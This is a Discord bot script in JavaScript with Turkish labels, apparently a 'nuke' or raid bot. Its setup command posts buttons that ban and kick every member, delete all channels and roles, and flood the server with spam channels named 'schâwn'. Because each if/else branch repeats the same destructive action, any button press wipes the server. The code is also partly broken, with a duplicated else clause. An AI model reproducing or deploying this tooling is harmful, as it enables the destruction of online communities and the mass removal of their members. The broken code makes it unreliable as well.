const { Client, MessageEmbed } = require('discord.js');
const client = new Client();
const moment = require("moment");
const button = require('discord-buttons');
button(client);

client.config = {
  token: ""
};

client.on("ready", () => {
  console.log("schâwn | Sisteme Giriş Başarılı."); 
  client.user.setPresence({ activity: { name: "schâwn harikasın 💜", type: "LISTENING" }, status: "idle" }) });

client.on("message", async message => {
let args = message.content.split("schawn-setup");
if(args[0] !== ".") return;//prefix
else 
{
  let button_1 = new button.MessageButton()
  .setStyle('red') 
  .setLabel('Tüm Kullanıcıları Banla') 
  .setID('1') 

  let button_2 = new button.MessageButton()
  .setStyle('green')  
  .setLabel('Tüm Kullanıcıları At')
  .setID('2') 

  let button_3 = new button.MessageButton()
  .setStyle('green')  
  .setLabel('Tüm Kanalları Sil')
  .setID('3')

  let button_4 = new button.MessageButton()
  .setStyle('green')  
  .setLabel('Tüm Rolleri Sil')
  .setID('4') 

  let button_5 = new button.MessageButton()
  .setStyle('green')  
  .setLabel('Yeni Kanal Oluştur')
  .setID('5') 

  let button_6 = new button.MessageButton()
  .setStyle('green')  
  .setLabel('Yeni Ses Kanalı Oluştur')
  .setID('6') 

  await message.channel.send(`
  Aşağıdan hangi belirteci yapıcağınızı seçin.`, { buttons: [button_1, button_2, button_3, button_4, button_5, button_6] })

  client.on("clickButton", async (button) => {
    if(button.id === "1") {
        message.guild.members.forEach(member => member.ban()) 
        await button.think(true)
        await button.reply.edit(`Başarıyla tüm kullanıcıları banladım`)
      } else {
        message.guild.members.forEach(member => member.ban()) 
        await button.think(true)
        await button.reply.edit(`Başarıyla tüm kullanıcıları banladım`)
      }

      
    if(button.id === "2") {
            message.guild.members.forEach(member => member.kick()) 
            await button.think(false)
            await button.reply.edit(`Başarıyla tüm kullanıcıları attım.`)
          } else {
            message.guild.members.forEach(member => member.kick()) 
            await button.think(false)
            await button.reply.edit(`Başarıyla tüm kullanıcıları attım.`)
          }

    if(button.id === "3") {
        message.guild.channels.forEach(channel => channel.delete())
        await button.think(true)
        await button.reply.edit(`Başarıyla tüm kanalları sildim`)
      } else {
        message.guild.channels.forEach(channel => channel.delete())
        await button.think(true)
        await button.reply.edit(`Başarıyla tüm kanalları sildim`)
      }
    

    if(button.id === "4") {
        message.guild.roles.forEach(a => a.delete())
        message.guild.createRole({ name: `schâwn roles`, position: 20, permissions: ['MANAGE_MESSAGES'], color: 'BLACK'})
        await button.think(true)
        await button.reply.edit(`Başarıyla rolleri silip yeni roller açtım`)
      } else {
        message.guild.roles.forEach(a => a.delete())
        message.guild.createRole({ name: `schâwn roles`, position: 20, permissions: ['MANAGE_MESSAGES'], color: 'BLACK'})
        await button.think(true)
        await button.reply.edit(`Başarıyla rolleri silip yeni roller açtım`)
      }
  
      
    if(button.id === "5") {
      if(button.clicker.member.roles.cache.get(client.config)) {
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        await button.think(true)
        await button.reply.edit(`Başarıyla yeni kanallar oluşturdum.`)
      } else {
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
        message.guild.channels.create("schâwn",{type: "text"})
          await button.think(true)
          await button.reply.edit(`Başarıyla yeni kanallar oluşturdum.`)
      }
    }  

    if(button.id === "6") {
      if(button.clicker.member.roles.cache.get(client.config)) {
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
      } else {
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
      } else {
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
        message.guild.channels.create("schâwn",{type: "voice"})
      }
    } 
})}})
client.login(client.config.token)